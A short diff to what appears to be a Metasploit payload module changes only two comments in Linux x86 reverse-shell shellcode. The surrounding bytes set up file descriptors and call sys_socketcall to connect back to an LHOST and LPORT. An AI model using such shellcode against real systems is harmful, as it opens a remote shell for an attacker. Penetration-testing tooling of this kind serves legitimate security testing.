@@ -55,8 +55,8 @@ module Metasploit3
     "\xcd\x80"             +#   int 0x80
     "\x49"                 +#   dec ecx
     "\x79\xf9"             +#   jns 0x11
-    "\x68" + [IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i].pack('N') + #   push dword 0x100007f
-    "\x68\x02\x00" + [datastore['LPORT'].to_i].pack('S>') + #   push dword 0xbfbf0002
+    "\x68" + [IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i].pack('N') + #   push ip addr
+    "\x68\x02\x00" + [datastore['LPORT'].to_i].pack('S>') + #   push port
     "\x89\xe1"             +#   mov ecx,esp
     "\xb0\x66"             +#   mov al,0x66 (sys_socketcall)
     "\x50"                 +#   push eax
